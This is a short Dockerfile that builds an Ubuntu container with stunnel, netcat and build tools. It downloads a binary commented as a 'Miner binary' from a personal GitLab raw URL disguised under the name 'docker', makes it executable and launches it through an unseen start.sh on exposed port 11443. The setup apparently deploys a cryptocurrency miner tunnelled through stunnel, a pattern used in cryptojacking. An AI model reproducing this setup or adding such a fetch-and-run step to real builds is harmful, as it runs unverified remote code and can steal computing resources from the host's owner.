FROM ubuntu:22.04

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \
    stunnel4 curl wget procps build-essential gcc psmisc netcat-openbsd \
    && rm -rf /var/lib/apt/lists/*

# Miner binary
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 11443

CMD ["./start.sh"]
